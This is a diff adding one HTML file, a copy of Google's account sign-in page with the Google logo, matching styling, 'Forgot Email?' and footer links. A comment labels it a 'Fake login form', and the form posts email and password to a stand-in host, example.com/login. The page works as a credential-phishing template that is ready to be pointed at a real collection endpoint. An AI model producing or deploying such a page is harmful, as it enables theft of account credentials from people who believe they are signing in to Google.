@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in – Google accounts</title>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #202124;
+        }
+
+        .login-box {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+
+        img {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #155abc;
+        }
+
+        .forgot-email {
+            display: block;
+            text-align: left;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .forgot-email a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .forgot-email a:hover {
+            text-decoration: underline;
+        }
+
+        .learn-more {
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .learn-more a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .learn-more a:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            margin-top: 30px;
+            font-size: 14px;
+        }
+
+        .create-account a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+        }
+
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer span {
+            margin: 0 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <!-- Google logo -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+
+        <!-- Fake login form -->
+        <form action="https://example.com/login" method="POST">
+            <input type="email" placeholder="Email or phone" required><br>
+            <a href="#" class="forgot-email">Forgot Email?</a>
+            <input type="password" placeholder="Enter your password" required><br>
+            <div class="learn-more">
+                <p>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+            </div>
+            <input type="submit" value="Next">
+        </form>
+
+        <div class="create-account">
+            <a href="#">Create account</a>
+        </div>
+
+        <div class="footer">
+            <a href="#">English (United States)</a>
+            <span>•</span>
+            <a href="#">Help</a>
+            <span>•</span>
+            <a href="#">Privacy</a>
+            <span>•</span>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+</body>
+</html>
